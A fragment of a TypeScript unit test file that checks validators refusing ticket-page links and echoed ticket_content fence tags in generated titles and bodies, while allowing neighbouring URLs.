      code: "TICKET_LINK",
    });
    expect(reason({ bodyMarkdown: `## Steps\n\nRead [the update](${link}).` })).toBe(
      "TICKET_LINK",
    );
  });

  it("allows the neighbours /statuses, /ticketsfoo and /kb/how-to", () => {
    for (const link of [
      "https://example.com/statuses",
      "https://example.com/ticketsfoo",
      "https://example.com/kb/how-to",
    ]) {
      expect(isTicketPageUrl(link), link).toBe(false);
      expect(titleRefusal(`See ${link}`).ok, link).toBe(true);
      expect(bodyRefusal(`Read [the page](${link}).`).ok, link).toBe(true);
      expect(reason({ bodyMarkdown: `## Steps\n\nRead [the page](${link}).` }), link).toBe("OK");
    }
  });
});

describe("review a2-IN-01: a fence tag echoed in the title is refused", () => {
  it("refuses a title that echoes a ticket_content tag (FENCE_ECHO)", () => {
    expect(reason({ title: 'Reset <ticket_content id="T1"> guide' })).toBe("FENCE_ECHO");
    expect(reason({ title: "Reset </ticket_content> guide" })).toBe("FENCE_ECHO");
    expect(reason({ title: "Reset ticket content guide" })).toBe("OK");
  });
});
